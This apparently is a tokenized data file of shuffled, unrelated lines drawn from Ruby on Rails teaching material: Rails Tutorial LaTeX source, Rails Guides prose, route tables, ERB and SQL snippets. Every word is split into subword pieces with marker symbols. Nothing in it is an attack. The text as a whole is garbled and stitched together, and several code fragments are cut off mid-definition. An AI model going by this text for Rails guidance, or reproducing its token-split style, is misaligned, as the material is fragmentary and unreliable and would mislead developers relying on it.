▁ Part ▁of ▁this ▁issue ▁relie d ▁on ▁a ▁ mis concept ion ; ▁\ href { http :// id le process ▖ word press ▖ com / 200 9 / 11 / 2 4/ present ation - summary - high - perform ance - at - mass ive - scale - less on s - learned - at - fa ce book /}{ you ▁ scale ▁a ▁\ emph { site }, ▁not ▁a ▁framework }, ▁and ▁Rails , ▁as ▁a wesome ▁as ▁it ▁is , ▁is ▁only ▁a ▁framework .
▁If ▁you ▁want ▁to ▁assign ▁an ▁object ▁to ▁a ▁` has _ many ` ▁association ▁without ▁saving ▁the ▁object , ▁use ▁the ▁` collection ▖ build ` ▁method .
▁The ▁error ▁page ▁for ▁a ▁valid ▁signup ▁submission .
▁The ▁only ▁exception ▁is ▁in ▁Section ~\ ref { sec : scope s _ subselect s _ and _ a _ lambda } .
▁Inde ed , ▁much ▁of ▁the ▁ el eg ance ▁of ▁Rails ▁ ultimate ly ▁d er ive s ▁from ▁the ▁m all e ability ▁of ▁the ▁under ly ing ▁Ruby ▁language .
▁A ▁test ▁to ▁catch ▁un w an ted ▁flash ▁ persistence ▖
▁As ▁usual , ▁we ▁can ▁express ▁the ▁requirement ▁for ▁\ k ode { authenticate } ▁using ▁RSpec .
▁In ▁this ▁example , ▁the ▁` articles _ path ` ▁helper ▁is ▁passed ▁to ▁the ▁`: url ` ▁option .
▁| ▁POST ▁| ▁ / photos ▁| ▁photos # create ▁| ▁create ▁a ▁new ▁ photo ▁|
▁=> ▁" The ▁string ▁is ▁nonempty "
▁=> ▁" New lines ▁(\ \ n ) ▁and ▁ tab s ▁(\ \ t ) ▁both ▁use ▁the ▁back slash ▁character ▁\ \ ▖ "
▁( Because ▁the ▁argument ▁refer s ▁to ▁the ▁remember ▁token , ▁it ▁is ▁not ▁un common ▁to ▁use ▁a ▁method ▁argument ▁that ▁has ▁the ▁same ▁name ▖)
▁E x plain ing ▁Rack ▁is ▁not ▁really ▁in ▁the ▁scope ▁of ▁this ▁guide ▖
▁In ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁we ' ll ▁make ▁a ▁second ▁project , ▁who se ▁purpose ▁is ▁to ▁demonstrate ▁the ▁basic ▁working s ▁of ▁a ▁Rails ▁application .
▁The ▁\ k ode { update } ▁action ▁for ▁password ▁reset .
▁( U nfortunately , ▁I ▁don ' t ▁have ▁a ▁person al ▁recommend ation ▁here , ▁but ▁\ href { http :// head first lab s ▖ com / books / h f html /}{ \ emph { Head ▁First ▁HTML } } ▁look s ▁pro mis ing , ▁and ▁one ▁reader ▁recommend s ▁\ href { http :// www ▖ a mazon ▖ com / gp / product / 0 59 6 5 2 6 87 3 }{\ emph { CSS : ▁The ▁ Missing ▁M an u al } } ▁by ▁ David ▁S a w y er ▁M c F ar l and ▖)
▁If ▁your ╼ validation ▁fails , ▁you ▁should ▁add ▁an ▁error ▁message ▁to ▁the ▁model , ▁therefore ╼ ma k ing ▁it ▁invalid .
▁A ▁test ▁for ▁an ▁invalid ▁signup ▖
▁Before ▁implement ing ▁user ▁following ▁and ▁followers , ▁we ▁first ▁need ▁to ▁es tab li sh ▁the ▁association ▁between ▁users ▁and ▁relationships .
▁* ▁** Don ' t ▁R epeat ▁Your self : ** ▁ DRY ▁is ▁a ▁principle ▁of ▁software ▁development ▁which ╼ ▁state s ▁that ▁" E ve ry ▁piece ▁of ▁ knowledg e ▁must ▁have ▁a ▁single , ▁un a mb ig u ous , ▁author it a tive ╼ ▁representation ▁within ▁a ▁system ▖ "
▁That ▁environment ▁is ▁no ▁different ▁than ▁the ▁default ▁one s , ▁start ▁a ▁server ▁with ▁` rails ▁server ▁- e ▁ staging `, ▁a ▁console ▁with ▁` rails ▁console ▁ staging `, ▁` Rails ▖ env ▖ staging ?` ▁works , ▁etc .
▁We ' ll ▁make ▁do ▁by ▁a do p ting ▁the ▁convention ▁that ▁all ▁fixture ▁users ▁have ▁the ▁same ▁password ▁(\ k ode { ' password ' }) .
▁You ▁m ight ▁have ▁notice d ▁that ▁Listing ~\ ref { code : po p ul at or _ with _ admin } ▁make s ▁the ▁user ▁an ▁admin ▁by ▁including ▁\ k ode { admin : ▁true } ▁in ▁the ▁initialization ▁hash .
▁### ▁ Back end s
▁<%= ▁f ▖ text _ field ▁: author _ name ▁%>
▁User Mailer ▖ welcome _ email (@ user )▖ deliver _ later
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁" a " ▁=> ▁" a "} ▖ symbolize _ keys
▁ Most ▁migrations , ▁including ▁all ▁the ▁one s ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁are ▁\ emph { reversible }, ▁which ▁means ▁we ▁can ▁`` migrate ▁down '' ▁and ▁undo ▁them ▁with ▁a ▁single ▁Rake ▁task , ▁called ▁\ k ode { db : rollback } :
▁The ▁engine ▁is ▁un able ▁to ▁find ▁the ▁partial ▁required ▁for ▁rendering ▁the ▁comments ▖╼
▁( N o w ▁you ▁know ▁why ▁the ▁\ k ode { before \_ save } ▁callback ▁from ▁Listing ~\ ref { code : email _ downcase } ▁uses ▁\ k ode { self ▖ email } ▁instead ▁of ▁just ▁\ k ode { email } ▖)
▁The ▁view ▁for ▁the ▁\ k ode { help } ▁action ▁is ▁analogous ▁( Listing ~\ ref { code : raw _ help _ view }) .
▁Now ▁when ▁confirmation ▁validations ▁fail , ▁the ▁error ▁will ▁be ▁attached ▁to ▁`: # { attribute } _ confirmation ` ▁instead ▁of ▁` attribute ` .
▁If ▁so , ▁you ▁can ▁add ▁a ▁comment ▁to ▁the ▁issue ▁say ing ▁that ▁you ' re ▁see ing ▁the ▁same ▁thing .
▁* ▁h im self ▁or ▁ her self ▖▖▖ ▁use ▁themselves .
▁The ▁`@ article ` ▁object ▁is ▁available ▁to ▁any ▁partials ▁rendered ▁in ▁the ▁view ▁because ╼ we ▁defined ▁it ▁as ▁an ▁instance ▁variable .
▁Now ▁you ▁can ▁simply ▁do :
▁As ▁show n ▁in ▁Listing ~\ ref { code : preventing _ unactivated _ login s }, ▁the ▁way ▁to ▁do ▁this ▁is ▁to ▁log ▁the ▁user ▁in ▁as ▁usual ▁if ▁\ k ode { user ▖ activated ?}\ ▁is ▁true ; ▁otherwise , ▁we ▁redirect ▁to ▁the ▁root ▁URL ▁with ▁a ▁\ k ode { warning } ▁message ▁( Figure ~\ ref { fig : not _ activated _ warning }) .
▁| ` logger ` | G en er ate s ▁information ▁on ▁the ▁mail ing ▁run ▁if ▁available ▖
▁You ▁can ▁specify ▁static ▁segment s ▁when ▁creating ▁a ▁route ▁by ▁not ▁pre pending ▁a ▁ col on ▁to ▁a ▁f ra g ment :
▁This ▁indicates ▁a ▁missing ▁template , ▁which ▁in ▁the ▁context ▁of ▁Rails ▁is ▁ essentially ▁the ▁same ▁thing ▁as ▁a ▁view .
▁email = foo %40 example ▖ com
▁( As ▁we ' ll ▁see ▁in ▁detail ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁this ▁user ▁data ▁is ▁store d ▁in ▁a ▁database ▁back - end ▖)
▁If ▁the ▁action ▁is ▁not ▁being ▁used ▁in ▁a ▁public ▁API ▁and ▁you ▁are ▁free ▁to ▁change ▁the ╼ HTTP ▁method , ▁you ▁can ▁update ▁your ▁route ▁to ▁use ▁` patch ` ▁instead ▁of ▁` put `:
▁def ▁set _ condition al _ cache _ control !
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / object / blank ▖ rb ` .
▁Ruby , ▁like ▁many ▁object - or i ent ed ▁languages , ▁uses ▁\ emph { classes } ▁to ▁ org an ize ▁methods ; ▁these ▁classes ▁are ▁then ▁\ emph { instantiated } ▁to ▁create ▁objects .
▁It ▁will ▁look ▁a ▁little ▁basic ▁for ▁now , ▁but ▁that ' s ▁ o k ▖
▁Use ▁of ▁a ▁standard ▁development ▁environment ▁in ▁the ▁cloud ▁( Section ~\ ref { sec : up _ and _ running }), ▁which ▁ side step s ▁many ▁of ▁the ▁problem s ▁ associated ▁with ▁ installing ▁and ▁ configuring ▁a ▁new ▁system
▁If ▁the ▁two ▁match , ▁then ▁the ▁submitted ▁password ▁is ▁correct ▁and ▁the ▁user ▁is ▁ authenticated .
▁The ▁`: through ` ▁option ▁specifie s ▁a ▁join ▁model ▁through ▁which ▁to ▁perform ▁the ▁query ▖
▁\ href { http :// www ▖ michael hartl ▖ com /}{ Michael ▁Hartl } ▁is ▁the ▁author ▁of ▁the ▁\ href { http :// www ▖ railstutorial ▖ org /}{ \ emph { Ruby ▁on ▁Rails ▁Tutorial } }, ▁one ▁of ▁the ▁leading ▁introduction s ▁to ▁web ▁development , ▁and ▁is ▁a ▁c of ound er ▁of ▁the ▁\ href { http :// www ▖ s of t c over ▖ io /}{ S of t c over } ▁self - publish ing ▁platform .
▁ Back ▁in ▁` Article sController `, ▁we ▁need ▁to ▁change ▁the ▁` create ` ▁action ╼ to ▁use ▁the ▁new ▁` Article ` ▁model ▁to ▁save ▁the ▁data ▁in ▁the ▁database ▖╼
▁For ▁example ▁` ActionMailer :: Base ` ▁defines :
▁" p ", ▁" q ", ▁" r ", ▁" s ", ▁" t ", ▁" u ", ▁" v ", ▁" w ", ▁" x ", ▁" y ", ▁" z "]
▁** N ▁+ ▁1 ▁queries ▁problem **
▁A ▁brief ▁ description ▁of ▁the ▁application
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / module / alias ing ▖ rb ` .
▁We ▁could ▁call ▁them ▁\ emph { following }, ▁but ▁that ' s ▁a mb ig u ous : ▁in ▁normal ▁English , ▁a ▁`` following '' ▁is ▁the ▁set ▁of ▁people ▁following ▁\ emph { you }, ▁i ▖ e ▖ , ▁your ▁followers --- exactly ▁the ▁oppos ite ▁of ▁the ▁intend ed ▁meaning .
▁* ▁FROM ▁" articles "
▁In ▁the ▁final ▁command , ▁we ▁use ▁the ▁\ k ode { valid ?}\ ▁method , ▁which ▁returns ▁\ k ode { false } ▁when ▁the ▁object ▁fails ▁one ▁or ▁more ▁validations , ▁and ▁\ k ode { true } ▁when ▁all ▁validations ▁pass .
▁def ▁name _ with _ initial
▁clients ▖ each ▁do ▁| client |
▁The ▁user ▁index ▁page ▁(\ href { http ://0▖0▖0▖0:3000/ users }{/ users }) ▁with ▁a ▁second ▁user .
▁% w ( 1 ▁2 ▁3 ▁4 ▁5 ▁6 ▁7 )▖ in _ groups (3)
▁O p en ▁class ing ▁an ▁ Engine ▁class ╼ re define s ▁it ▁for ▁use ▁in ▁the ▁main ▁application ▖
▁page ▁to ▁show ▁user
▁| ▁DELETE ▁| ▁ / photos / : id ▁| ▁images # destroy ▁| ▁ photo _ path (: id ) ▁|
▁$ ▁ heroku ▁run ▁console
▁ --- ---------------- ----------------
▁( Compar e ▁to ▁the ▁password ▁digest ▁migration ▁in ▁Section ~\ ref { sec : a _ hashed _ password } ▖)
▁ umerate }╼╼ ▁% ▁subsection ▁creating _ microposts ▁( end )╼╼ ▁\ subsection { A ▁ proto - feed } ▁% ▁( fold )╼ ▁\ label { sec : a _ proto _ feed }╼╼
▁# ▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁orders _ count ▁ASC , ▁created _ at ▁DESC
▁encoding : ▁' S pe cial Encoding ',
▁Recall ▁that ▁the ▁id ▁of ▁the ▁user ▁is ▁available ▁in ▁the ▁\ k ode { params [: id ]} ▁variable , ▁which ▁means ▁that ▁we ▁can ▁find ▁the ▁user ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : initial _ edit _ action } .
▁\ href { https :// bitbucket ▖ org / account / signup /}{ Sign ▁up ▁for ▁a ▁Bitbucket ▁account } ▁if ▁you ▁don ' t ▁already ▁have ▁one .
▁The ▁\ k ode { save } ▁method ▁returns ▁\ k ode { true } ▁if ▁it ▁succeed s ▁and ▁\ k ode { false } ▁otherwise .
▁` invalid ?` ▁is ▁simply ▁the ▁ inverse ▁of ▁` valid ?` ▖
▁# ▁=> ▁ { 1 =>1 , ▁nil => nil , ▁: a =>" a "}
▁ Write ▁an ▁integration ▁test ▁for ▁all ▁the ▁layout ▁links , ▁including ▁the ▁proper ▁behavior ▁for ▁logged - in ▁and ▁non - logged - in ▁users .
▁T hanks ▁to ▁reader ▁ Andy ▁P hi l ips ▁for ▁point ing ▁out ▁this ▁issue ▁and ▁for ▁encourag ing ▁me ▁to ▁fix ▁the ▁broken ▁terminology ▖)
▁before _ save ▁: before _ save _ callback ▁# ▁G O O D
▁No ▁not ion ▁of ▁`` following '' ▁or ▁`` followed ''
▁Find ▁the ▁line ▁beginning ▁with ▁` root ` ▁and ╼ un comment ▁it ▖
▁Ou r ▁method ▁for ▁making ▁static ▁pages ▁is ▁ probably ▁the ▁simple st , ▁but ▁it ' s ▁not ▁the ▁only ▁way .
▁### ▁`: allow _ nil `
▁server ▖ start
▁</ span >
▁With ▁that , ▁all ▁of ▁the ▁routes ▁for ▁static ▁pages ▁are ▁working , ▁and ▁the ▁tests ▁should ▁pass :
▁Here ' s ▁a ▁ summary ▁of ▁the ▁pro s ▁and ▁con s :
▁ Comment ing ▁out ▁a ▁validation ▁to ▁ensure ▁a ▁failing ▁test .
▁A ▁ filled - in ▁form ▁with ▁\ k ode { text } ▁and ▁\ k ode { password } ▁fields .
▁This ▁is ▁actually ▁a ▁convenient ▁method ▁which ▁calls ▁` content _ tag _ for ` ▁internally ▁with ▁`: div ` ▁as ▁the ▁tag ▁name ▖
▁* ▁` active _ record ▖ initialize _ time zone ` ▁Set s ▁` ActiveRecord :: Base ▖ time _ zone _ aware _ attributes ` ▁to ▁true , ▁as ▁well ▁as ▁setting ▁` ActiveRecord :: Base ▖ default _ time zone ` ▁to ▁UTC ▖ ▁When ▁attributes ▁are ▁read ▁from ▁the ▁database , ▁they ▁will ▁be ▁convert ed ▁into ▁the ▁time ▁ zone ▁specified ▁by ▁` Time ▖ zone ` .
▁# ▁Buil d ▁JSON ▁API s ▁with ▁ ea se .
▁What ▁is ▁Action ▁View ?
▁So , ▁for ▁our ▁User Mailer ▁example , ▁if ▁you ▁have ╼` welcome _ email ▖ text ▖ erb ` ▁and ▁` welcome _ email ▖ html ▖ erb ` ▁in ╼` app / views / user _ mailer `, ▁Action ▁Mailer ▁will ▁automatically ▁send ▁a ▁ multipart ▁email ╼ with ▁the ▁HTML ▁and ▁text ▁versions ▁setup ▁as ▁different ▁parts .
▁### ▁Configur ing ▁Action ▁Controller
▁$ ▁rails ▁server
▁" table "▖ pluralize ▁# ▁=> ▁" table s "
▁By ▁using ▁the ▁\ k ode { log \_ in \_ as } ▁method ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in }, ▁we ▁can ▁test ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁as ▁in ▁Listing ~\ ref { code : edit _ update _ wrong _ user _ tests } .
▁ Meanwhile , ▁the ▁\ k ode { alt } ▁attribute ▁is ▁what ▁will ▁be ▁displayed ▁if ▁the ▁page ▁is ▁access ed ▁by ▁a ▁program ▁that ▁can ' t ▁display ▁images ▁( such ▁as ▁ screen ▁readers ▁for ▁the ▁ visual ly ▁ im p a ir ed ) .
▁</ h 1>
▁The ▁` find ` ▁method ▁will ▁raise ▁an ▁` ActiveRecord :: RecordNotFound ` ▁exception ▁if ▁no ▁matching ▁record ▁is ▁found .
▁# ▁=> ▁( 123 ) ▁ 555-1234
▁You ▁can ▁do ▁this ▁by ▁ configuring ▁Rails ▁to ╼ set ▁your ▁CDN ▁as ▁the ▁asset ▁host ▁instead ▁of ▁using ▁a ▁relative ▁path ▖
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : create _ js _ erb } .
▁This ▁is ▁what ▁prevent s ▁arbitrar y ▁users ▁from ▁gra nt ing ▁themselves ▁ administrative ▁access ▁to ▁our ▁application .
▁We ▁first ▁invoke ▁the ▁console ▁with ▁\ k ode { rails ▁console } ▁at ▁the ▁command ▁line , ▁and ▁then ▁retrieve ▁the ▁first ▁user ▁from ▁the ▁database ▁using ▁\ k ode { User ▖ first } ▁( putting ▁the ▁results ▁in ▁the ▁variable ▁\ k ode { first \_ user })
▁The ▁cloud ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment } ▁includes ▁Git ▁by ▁default , ▁so ▁no ▁installation ▁is ▁necessary ▁in ▁this ▁case .
▁See d ing ▁the ▁database ▁can ▁be ▁ s low , ▁and ▁on ▁some ▁systems ▁could ▁take ▁up ▁to ▁a ▁few ▁minutes .
▁In ▁the ▁next ▁chapter , ▁we ' ll ▁build ▁on ▁the ▁foundation ▁from ▁Chapter ~\ ref { cha : begin n ers } ▁to ▁make ▁a ▁database - back ed ▁\ emph { toy ▁app }, ▁which ▁will ▁give ▁us ▁our ▁first ▁real ▁taste ▁of ▁what ▁Rails ▁can ▁do .
▁In ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁we ' ll ▁make ▁a ▁second ▁project , ▁who se ▁purpose ▁is ▁to ▁demonstrate ▁the ▁basic ▁working s ▁of ▁a ▁Rails ▁application .
▁arrange s ▁for ▁the ▁ dependent ▁microposts ▁( i ▖ e ▖ , ▁the ▁one s ▁ belonging ▁to ▁the ▁given ▁user ) ▁to ▁be ▁destroyed ▁when ▁the ▁user ▁itself ▁is ▁destroyed .
▁* ▁` update _ column `
▁respond _ to ▁do ▁| format |
▁# ▁ Message ▁ chain ing
▁NOTE : ▁The ▁match er ▁( and ▁other ▁ member s ▁of ▁the ▁ precompile ▁array ; ▁see ▁below ) ▁is ╼ app li ed ▁to ▁final ▁ compiled ▁file ▁names ▖
▁* ▁How ▁to ▁properly ▁ org an ize ▁your ▁application ▁assets .
▁One ▁of ▁the ▁best ▁things ▁about ▁the ▁asset ▁pipeline ▁is ▁that ▁it ▁automatically ▁results ▁in ▁assets ▁that ▁are ▁optimized ▁to ▁be ▁ efficient ▁in ▁a ▁production ▁application .
▁When ▁writing ▁ordinar y ▁Ruby , ▁you ▁often ▁write ▁module s ▁and ▁include ▁them ▁explicitly ▁yourself , ▁but ▁in ▁the ▁case ▁of ▁a ▁helper ▁module ▁Rails ▁handle s ▁the ▁inclusion ▁for ▁us .
▁With in ▁an ▁engine , ▁there ▁may ▁come ▁a ▁time ▁where ▁you ▁wish ▁to ▁use ▁things ▁such ▁as ╼ initializers , ▁inter n ation a li z ation ▁or ▁other ▁configuration ▁options ▖
▁( In ▁fact , ▁the ▁\ href { http :// railstutorial ▖ org } { Ruby ▁on ▁Rails ▁Tutorial ▁site } ▁live s ▁at ▁Heroku ; ▁if ▁you ' re ▁reading ▁this ▁book ▁online , ▁you ' re ▁look ing ▁at ▁a ▁Heroku - host ed ▁site ▁right ▁now ! )
▁This ▁is ▁a ▁problem ▁because ╼ this ▁route ▁go es ▁to ▁the ▁very ▁page ▁that ▁you ' re ▁on ▁right ▁at ▁the ▁moment , ▁and ▁that ╼ route ▁should ▁only ▁be ▁used ▁to ▁display ▁the ▁form ▁for ▁a ▁new ▁article .
▁Extensions ▁to ▁` File `
▁That ▁\ emph { is } ▁what ▁we ▁want , ▁and ▁it ▁lead s ▁to ▁the ▁\ k ode { password \_ reset \_ expired ?}\ ▁method ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired } .
▁### ▁By te s
▁This ▁method ▁take s ▁a ▁block ▁that ▁contains ▁the ▁content ▁you ▁wish ▁to ▁cache ▖
▁If ▁you ▁try ▁to ▁use ▁more ▁connection s ▁than ▁are ▁available , ▁Active ▁Record ▁will ▁block ╼ and ▁wait ▁for ▁a ▁connection ▁from ▁the ▁ po ol ▖
▁We ' ll ▁write ▁simple ▁tests ▁for ▁each ▁of ▁the ▁title s ▁in ▁Table ~\ ref { table : static _ pages } ▁by ▁ com bin ing ▁the ▁tests ▁in ▁Listing ~\ ref { code : about _ test } ▁with ▁the ▁\ k ode { assert \_ select } ▁method , ▁which ▁let s ▁us ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁HTML ▁tag ▁( some times ▁called ▁a ▁`` select or '' , ▁hence ▁the ▁name )
▁Some ▁ references ▁indicate ▁that ▁the ▁view ▁returns ▁the ▁HTML ▁directly ▁to ▁the ▁browser ▁( via ▁a ▁web ▁server ▁such ▁as ▁ Apache ▁or ▁N g in x ) .
▁person ▖ errors [: name ] ▁# ▁=> ▁[]
▁The ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁ o we s ▁a ▁lot ▁to ▁my ▁previous ▁Rails ▁book , ▁\ emph { RailsSpace }, ▁and ▁hence ▁to ▁my ▁co author ▁\ href { http :// a ure ▖ com /}{ A ure li us ▁ Pro cha z k a } .
▁When ▁a ▁form ▁is ▁submitted , ▁the ▁fields ▁of ▁the ▁form ▁are ▁sent ▁to ▁Rails ▁as ╼ _ parameters _ ▖
▁ Admin ? ▁: ▁<%= ▁ permission _ field s ▖ check _ box ▁: admin ▁%>
▁Command
▁ Only ▁enabled ▁when ▁` config ▖ cache _ classes ` ▁is ▁` false ` .
▁Note ▁that ▁we ▁can ▁omit ▁the ▁\ k ode { user \_ url } ▁in ▁the ▁redirect , ▁writing ▁simply ▁\ k ode { redirect \_ to ▁@ user } ▁to ▁redirect ▁to ▁the ▁user ▁show ▁page .
▁Active ▁Support ▁ augment s ▁the ▁API ▁of ▁arrays ▁to ▁ ea se ▁certain ▁ways ▁of ▁access ing ▁them ▖
▁ Delete ▁all ╼ of ▁the ▁existing ▁code ▁in ▁the ▁file , ▁and ▁replace ▁it ▁with ▁the ▁following ▁single ▁line ╼ of ▁code :
▁You ▁should ▁see ▁the ▁Rails ▁default ▁information ▁page :
▁The ▁login ▁form .
▁<%= ▁stylesheet _ link _ tag ▁" blorgh / style ▖ css " ▁%>
▁By ▁represent ing ▁the ▁` author ` ▁association ' s ▁object ▁with ▁the ▁` User ` ▁class , ▁a ▁link ╼ is ▁es tab li sh ed ▁between ▁the ▁engine ▁and ▁the ▁application ▖
▁Then ▁reset ▁the ▁database ▁and ▁re - populate ▁the ▁sample ▁data :
▁<%= ▁render ▁" shared / ad _ banner " ▁%>
▁You ▁can ▁also ▁use ▁this ▁method ▁on ▁your ▁own ▖ ▁` valid ?` ▁trigger s ▁your ▁validations ╼ and ▁returns ▁true ▁if ▁no ▁errors ▁were ▁found ▁in ▁the ▁object , ▁and ▁false ▁otherwise .
▁Produce s
▁has _ many ▁: s ub or d in ate s , ▁class _ name : ▁" Employee ",
▁ ╼ ▁$ ▁rails ▁console ╼ ▁> > ▁1▖ year ▖ from _ now ╼ ▁=> ▁Sun , ▁09 ▁A ug ▁20 15 ▁ 16 : 48 : 17 ▁UTC ▁+00:00 ╼ ▁> > ▁10 ▖ weeks ▖ ago ╼ ▁=> ▁S at , ▁31 ▁May ▁2014 ▁ 16 : 48 : 45 ▁UTC ▁+00:00
▁The ▁first ▁method , ▁` find _ each `, ▁retrieve s ▁a ▁ batch ▁of ▁records ▁and ▁then ▁yields ▁ _ each _ ▁record ▁to ▁the ▁block ▁individual ly ▁as ▁a ▁model ▖
▁The ▁` last ` ▁method ▁returns ▁` nil ` ▁if ▁no ▁matching ▁record ▁is ▁found ▁and ▁no ▁exception ▁will ▁be ▁raised .
▁def ▁before _ save _ callback
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : sign _ in _ sign _ out } ▖)
▁Be h in d ▁the ▁ s c en es , ▁this ▁means ▁ extract ing ▁the ▁primary ▁key ▁from ▁this ▁object ▁and ▁setting ▁the ▁associate ▁object ' s ▁foreign ▁key ▁to ▁the ▁same ▁value .
▁* ▁Use ▁Rails ▁idiom s ▁and ▁helpers .
▁This ▁helper ▁validates ▁attributes ▁again st ▁a ▁block ▖
▁* ▁[ Rack ▁API ▁Documentation ]( http :// rack ▖ github ▖ io / )
▁You ▁can ▁get ▁the ▁actual ▁class ▁object ▁in v o k ing ▁` constantize ` ▁on ▁it , ▁explained ▁next .
▁use ▁this ▁style :
▁This ▁is ▁because ▁both ▁\ k ode { a } ▁and ▁\ k ode { b } ▁point ▁to ▁the ▁same ▁array .
▁def ▁find _ by _ order _ prefix ( order _ number )
▁Article ▁with ▁ Comments ]( images / getting _ started / article _ with _ comments ▖ png )
▁Some ▁parts ▁of ▁Rails ▁can ▁also ▁be ▁configured ▁external ly ▁by ▁supply ing ▁environment ▁variables ▖
▁The ▁` collection ▖ build ` ▁method ▁returns ▁a ▁new ▁object ▁of ▁the ▁ associated ▁type ▖
▁Instead , ▁we ▁can ▁arrange ▁for ▁a ▁ sequence ▁of ▁names ▁and ▁email ▁addresses ▁using ▁the ▁\ k ode { sequence } ▁method :
▁errors ▖ add (: expiration _ date , ▁" can ' t ▁be ▁in ▁the ▁ past ")
▁layout ▁: products _ layout
▁create ▁app / assets / javascripts / microposts ▖ js ▖ coffee
▁in ▁Listing ~\ ref { code : utility _ method _ tests } .
▁| ▁| ▁20 2 ▁| ▁: accept ed ▁|
▁#### ▁Rendering ▁JSON
▁Ruby ▁on ▁Rails ╼ ▁Tutorial
▁WARNING : ▁If ▁the ▁`: prefix ` ▁option ▁is ▁` true ` ▁this ▁is ▁less ▁generic , ▁see ▁below .
▁This ▁helper ▁validates ▁that ▁your ▁attributes ▁have ▁only ▁ numeric ▁values ▖
▁( C ur r ent ly , ▁all ▁save s ▁should ▁succeed ▁because ▁there ▁are ▁as ▁yet ▁no ▁validations ; ▁we ' ll ▁see ▁cases ▁in ▁Section ~\ ref { sec : user _ validations } ▁when ▁some ▁will ▁fail ▖)
▁The ▁` order ` ▁method ▁di c t ate s ▁the ▁order ▁in ▁which ▁ associated ▁objects ▁will ▁be ▁receive d ▁( in ▁the ▁syntax ▁used ▁by ▁an ▁SQL ▁` O R DER ▁BY ` ▁clause ) .
▁# ▁For get s ▁a ▁ persistent ▁session .
▁Un less ▁you ▁have ▁a ▁" Code ▁Re d , ▁M is s ion ▁C ri t ical , ▁the ▁World ▁is ▁Co m ing ▁to ▁an ▁En d " ▁kind ▁of ▁bug , ▁you ' re ▁creating ▁this ▁issue ▁report ▁in ▁the ▁h o pe ▁that ▁other s ▁with ▁the ▁same ▁problem ▁will ▁be ▁able ▁to ▁collaborat e ▁with ▁you ▁on ▁so l v ing ▁it ▖
▁The ▁\ k ode { belongs \_ to } ▁relationship ▁between ▁a ▁micropost ▁and ▁its ▁user .
▁in ▁Listing ~\ ref { code : correct _ signin _ failure _ test } .
▁This ▁can ▁include ▁a m end ing ▁existing ▁commit s ▖
▁Ju st ▁like ▁controllers , ▁any ▁instance ▁variables ▁we ▁define ▁in ▁the ▁method ▁become ╼ available ▁for ▁use ▁in ▁the ▁views .
▁* ▁` lib / assets ` ▁is ▁for ▁your ▁own ▁libraries ' ▁code ▁that ▁doesn ' t ▁really ▁fit ▁into ▁the ╼ scope ▁of ▁the ▁application ▁or ▁those ▁libraries ▁which ▁are ▁ shared ▁a cross ▁applications .
▁This ▁arrange s ▁to ▁show ▁a ▁standard ▁error ▁page ▁during ▁the ▁deployment ▁and ▁migration .
▁image _ url (" edit ▖ png ") ▁# ▁=> ▁ http :// www ▖ example ▖ com / assets / edit ▖ png
▁Testing ▁the ▁remember ▁branch
▁#### ▁Configur ing ▁a ▁PostgreSQL ▁Database ▁for ▁JRuby ▁P la t form
▁This ▁is ▁possible ▁by ▁specify ing ▁the ▁` includes ` ▁method ▁of ▁the ▁` Model ▖ find ` ▁call ▖
▁* ▁FROM ▁" users " ▁WHERE ▁" users "▖" state " ▁= ▁' active ' ▁ AND ▁" users "▖" state " ▁= ▁' inactive '
▁array ▁# ▁=> ▁[ ' foo ']
▁has _ one ▁: account , ▁class _ name : ▁" Billing ", ▁ dependent : ▁: nullify
▁** Adding ** ▁` Article # time _ since _ created `:
▁( We ' ll ▁be ▁using ▁only ▁one ▁for ▁now , ▁but ▁we ' ve ▁put ▁in ▁the ▁other s ▁for ▁future ▁reference ▖)
▁As ▁in ▁Section ~\ ref { sec : hello _ world } ▁and ▁Section ~\ ref { sec : mvc _ in _ action }, ▁this ▁involve s ▁edit ing ▁the ▁\ k ode { routes ▖ rb } ▁file ▁to ▁ connect ▁ / ▁to ▁a ▁page ▁of ▁our ▁choice , ▁which ▁in ▁this ▁case ▁will ▁be ▁the ▁Home ▁page .
▁Because ▁the ▁before ▁filter ▁operat es ▁on ▁a ▁per - action ▁basis , ▁we ' ll ▁put ▁the ▁corresponding ▁tests ▁in ▁the ▁Users ▁controller ▁test ▖ ▁The ▁plan ▁is ▁to ▁hit ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁action ▁with ▁the ▁right ▁kind s ▁of ▁requests ▁and ▁verify ▁that ▁the ▁flash ▁is ▁set ▁and ▁that ▁the ▁user ▁is ▁ redirected ▁to ▁the ▁login ▁path .
▁mail ( to : ▁email _ with _ name , ▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ')
▁ Adding ▁a ▁test ▁for ▁the ▁signup ▁page ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ rails _ routes } ▖)
▁<%= ▁user _ url (@ user , ▁host : ▁' example ▖ com ') ▁%>
▁A nother ▁source ▁of ▁duplication ▁appears ▁in ▁each ▁example ; ▁we ▁have ▁both
▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁This ▁object , ▁of ▁course , ▁should ▁have ╼ some ▁sort ▁of ▁identifie r ▁by ▁which ▁it ▁can ▁be ▁reference d .
▁@ users ▁= ▁User ▖ all
▁Let ' s ▁take ▁a ▁look ▁at ▁it ▁( Listing ~\ ref { code : default _ controller _ test }) .
▁render ▁template : ▁" books / edit "
▁* ▁FROM ▁` users ` ▁WHERE ▁` users ` ▖ ` id ` ▁= ▁1
